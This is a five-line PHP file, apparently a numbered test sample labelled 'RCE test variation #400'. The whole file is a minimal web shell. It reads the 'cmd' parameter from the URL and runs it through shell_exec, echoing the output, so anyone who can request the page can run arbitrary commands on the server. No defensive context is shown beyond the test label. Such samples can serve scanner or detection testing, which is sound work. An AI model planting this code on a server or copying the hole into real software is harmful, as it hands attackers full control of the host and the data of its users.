<?php
// RCE test variation #400
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>